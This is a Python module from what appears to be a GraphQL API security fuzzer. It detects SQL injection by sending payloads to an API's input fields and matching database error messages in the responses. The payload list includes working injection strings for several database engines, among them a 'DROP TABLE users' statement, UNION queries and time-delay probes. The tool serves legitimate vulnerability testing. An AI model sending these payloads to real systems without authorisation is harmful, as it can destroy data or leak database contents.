from typing import Type, override

import requests
import random

from graphqler.utils.api import API
from graphqler.utils.stats import Stats
from graphqler.utils import plugins_handler, detection_writer
from graphqler.fuzzer.engine.types import ResultEnum, Result

from ...materializers.getter import Getter
from ...materializers.injection_materializer import InjectionMaterializer
from ..detector import Detector


SQL_INJECTION_STRINGS = [
    # SQLite-specific: reference a non-existent table inside a subquery so the error
    # is raised within the *first* (and only) statement that sqlite3's db.all() executes.
    # These are placed first to ensure they are always tried.
    "\"' AND 1=(SELECT 1 FROM nonexistent_sqli_table_xyzzy)--\"",
    "\"' OR 1=(SELECT 1 FROM nonexistent_sqli_table_xyzzy)--\"",
    "\"' AND (SELECT COUNT(*) FROM nonexistent_sqli_table_xyzzy)>0--\"",
    # Generic
    '"aaa \' OR 1=1--"',
    '"\' OR \'1\'=\'1"',
    '"1; DROP TABLE users--"',
    '"1\' UNION SELECT null,null,null--"',
    '"1\' AND SLEEP(3)--"',
    '"\' OR 1=1 LIMIT 1--"',
    '"admin\'--"',
    '"1\' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--"',
    # MySQL-specific
    '"1\' AND BENCHMARK(5000000,MD5(1))--"',
    '"1\' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--"',
    # PostgreSQL-specific
    '"1\'; SELECT pg_sleep(3)--"',
    '"1\' AND 1=(SELECT 1 FROM pg_user LIMIT 1)--"',
    # MSSQL-specific
    '"1\'; WAITFOR DELAY \'0:0:3\'--"',
    '"1\' AND 1=@@version--"',
]

# Error messages commonly emitted by SQL databases that indicate injection success
SQL_ERROR_PATTERNS = [
    # Generic
    "syntax error",
    "invalid query",
    "sql syntax",
    "unexpected token",
    "unterminated string",
    "sqlstate",
    "jdbc",
    "odbc",
    # MySQL
    "you have an error in your sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "supplied argument is not a valid mysql",
    "warning: mysql",
    # PostgreSQL
    "pg_query",
    "pg_exec",
    "unterminated quoted string at or near",
    "postgresql",
    "psql",
    "pg_exception",
    # MSSQL / SQL Server
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "mssql_query",
    "sqlsrv_query",
    "incorrect syntax near",
    "@@version",
    # Oracle
    "ora-",
    "oracle error",
    "oracle.*driver",
    "warning.*oci_",
    "quoted identifier",
    # SQLite
    "sqlite_",
    "sqlite3",
    "sqliteexception",
    "no such table",
    "no such column",
    # Generic ORM / framework leaks
    "activerecord",
    "hibernate",
    "sequelizeerror",
    "knex",
    "typeorm",
]


class SQLInjectionGetter(Getter):
    def __init__(self, injection_string: str | None = None):
        super().__init__()
        self._injection_string = injection_string

    @override
    def get_random_string(self, input_name: str) -> str:
        if input_name in ['filter', 'search', 'query', 'name', 'username', 'password', 'email', 'id', 'text', 'message', 'input', 'value']:
            if self._injection_string is not None:
                return self._injection_string
            return random.choice(SQL_INJECTION_STRINGS)
        else:
            return super().get_random_string(input_name)


class SQLInjectionMaterializer(InjectionMaterializer):
    def __init__(self, api: API, fail_on_hard_dependency_not_met: bool = False, max_depth: int = 20, injection_string: str | None = None):
        super().__init__(api, fail_on_hard_dependency_not_met)
        self.api = api
        self.fail_on_hard_dependency_not_met = fail_on_hard_dependency_not_met
        self.getter = SQLInjectionGetter(injection_string)


# The main class that's being used
class SQLInjectionDetector(Detector):
    @property
    def DETECTION_NAME(self) -> str:
        return "SQL Injection (SQLi) Injection"

    @property
    def detect_only_once_for_api(self) -> bool:
        return False

    @property
    def detect_only_once_for_node(self) -> bool:
        return True

    @property
    def materializer(self) -> Type[SQLInjectionMaterializer]:
        return SQLInjectionMaterializer

    @override
    def detect(self) -> tuple[bool, bool]:
        """Try every SQL injection string in sequence and stop at the first confirmed hit.

        This exhaustive approach is necessary because different database backends respond
        to different injection techniques — a single random payload would miss databases
        that are not covered by that particular string (e.g. SQLite vs MySQL vs MSSQL).
        """
        last_graphql_response: dict = {}
        last_request_response: requests.Response | None = None

        for injection_string in SQL_INJECTION_STRINGS:
            materializer = SQLInjectionMaterializer(
                api=self.api,
                fail_on_hard_dependency_not_met=False,
                max_depth=3,
                injection_string=injection_string,
            )
            self.payload, _ = materializer.get_payload(self.name, self.objects_bucket, self.graphql_type)

            self.fuzzer_logger.debug(f"[Fuzzer] SQL Payload:\n{self.payload}")
            self.detector_logger.info(f"[Detector] SQL Payload:\n{self.payload}")

            graphql_response, request_response = plugins_handler.get_request_utils().send_graphql_request(self.api.url, self.payload)

            result = Result(
                result_enum=ResultEnum.GENERAL_SUCCESS,
                payload=self.payload,
                status_code=request_response.status_code,
                graphql_response=graphql_response,
                raw_response_text=request_response.text,
            )
            Stats().add_http_status_code(self.name, request_response.status_code)
            Stats().update_stats_from_result(self.node, result)

            self.detector_logger.info(f"[{request_response.status_code}] Response: {request_response.text}")
            self.fuzzer_logger.info(f"[{request_response.status_code}] Response: {graphql_response}")

            self._parse_response(graphql_response, request_response)
            last_graphql_response = graphql_response
            last_request_response = request_response

            if self.confirmed_vulnerable:
                break

        evidence = self._get_evidence(last_graphql_response, last_request_response)
        Stats().add_vulnerability(
            self.DETECTION_NAME,
            self.name,
            self.confirmed_vulnerable,
            self.potentially_vulnerable,
            payload=self.payload,
            evidence=evidence,
        )
        detection_writer.write_from_detector(
            vuln_name=self.DETECTION_NAME,
            node_name=self.name,
            is_vulnerable=self.confirmed_vulnerable,
            potentially_vulnerable=self.potentially_vulnerable,
            payload=self.payload,
            graphql_response=last_graphql_response,
            status_code=last_request_response.status_code if last_request_response else 0,
            evidence=evidence,
        )
        return (self.confirmed_vulnerable, self.potentially_vulnerable)

    def _is_vulnerable(self, graphql_response: dict, request_response: requests.Response) -> bool:
        response_text_lower = request_response.text.lower()
        return any(pattern in response_text_lower for pattern in SQL_ERROR_PATTERNS)

    def _is_potentially_vulnerable(self, graphql_response: dict, request_response: requests.Response) -> bool:
        # The broad "data returned on injection payload" check has been removed because any
        # endpoint using parameterised queries will return HTTP 200 + data, producing constant
        # false positives.  Blind SQL injection is covered by TimeSQLInjectionDetector, which
        # uses a baseline-controlled timing oracle instead.
        return False

    def _get_evidence(self, graphql_response: dict, request_response: requests.Response | None) -> str:
        if request_response is None:
            return ""
        response_text_lower = request_response.text.lower()
        for pattern in SQL_ERROR_PATTERNS:
            if pattern in response_text_lower:
                return f"matched SQL error pattern: '{pattern}'"
        return ""
